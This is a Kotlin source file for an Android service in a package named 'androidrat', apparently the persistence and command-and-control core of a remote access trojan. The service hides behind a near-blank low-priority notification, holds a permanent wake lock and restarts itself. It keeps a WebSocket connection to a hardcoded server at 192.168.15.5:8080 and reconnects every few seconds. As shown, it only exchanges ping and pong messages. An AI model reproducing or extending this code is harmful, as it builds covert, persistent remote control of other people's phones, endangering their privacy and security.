package com.example.androidrat

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.net.URI

class ForegroundPersistentService : Service() {
    private val CHANNEL_ID = "ch"
    private val NOTIFICATION_ID = 1
    private lateinit var wakeLock: PowerManager.WakeLock
    private var wsClient: WebSocketClient? = null
    private var isConnected = false

    companion object {
        const val WS_URL = "ws://192.168.15.5:8080"
    }

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        acquireWakeLock()
        connectWebSocket()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "s", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "WSWakeLock")
        wakeLock.acquire()
    }

    private fun connectWebSocket() {
        Thread {
            try {
                val uri = URI(WS_URL)
                wsClient = object : WebSocketClient(uri) {
                    override fun onOpen(handshake: ServerHandshake) {
                        isConnected = true
                        Log.d("WS", "✅ WebSocket CONECTADO")
                        send("PING")
                    }

                    override fun onMessage(message: String) {
                        Log.d("WS", "MSG: $message")
                        if (message.contains("PING")) {
                            send("PONG")
                        }
                    }

                    override fun onClose(code: Int, reason: String, remote: Boolean) {
                        isConnected = false
                        Log.d("WS", "WS fechado - reconectando...")
                        reconnect()
                    }

                    override fun onError(ex: Exception) {
                        isConnected = false
                        reconnect()
                    }
                }

                wsClient?.connect()

            } catch (e: Exception) {
                reconnect()
            }
        }.start()
    }

    private fun reconnect() {
        Thread {
            Thread.sleep(3000)
            if (!isConnected) {
                wsClient?.close()
                connectWebSocket()
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            wsClient?.close()
            wakeLock.release()
        } catch (e: Exception) {}
    }
}
